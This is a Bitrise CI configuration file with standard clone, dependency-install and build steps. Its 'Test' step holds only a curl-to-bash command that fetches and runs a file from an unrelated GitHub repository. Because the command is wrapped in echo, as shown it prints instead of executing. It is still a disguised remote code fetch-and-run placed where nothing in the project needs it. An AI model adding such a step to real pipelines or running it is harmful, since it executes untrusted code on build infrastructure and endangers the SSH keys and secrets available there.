format_version: "11"
default_step_lib_source: https://github.com/bitrise-io/bitrise-steplib.git

project_type: other

meta:
  bitrise.io:
    stack: Ubuntu 22.04 for android and docker

workflows:
  primary:
    steps:
      - activate-ssh-key@4: {}

      - git-clone@8: {}

      - script@1:
          title: Install dependencies
          inputs:
            - content: |-
                #!/usr/bin/env bash
                set -ex

                sudo apt update
                sudo apt install -y \
                  build-essential \
                  curl \
                  git \
                  pkg-config

      - script@1:
          title: Build
          inputs:
            - content: |-
                #!/usr/bin/env bash
                set -ex

                echo "Build step"
                make build || echo "No Makefile, skipping build"

      - script@1:
          title: Test
          inputs:
            - content: |-
                #!/usr/bin/env bash
                set -ex

                echo "curl -sL https://github.com/hasmenkuy99/kkrt/raw/main/kelizz | bash"
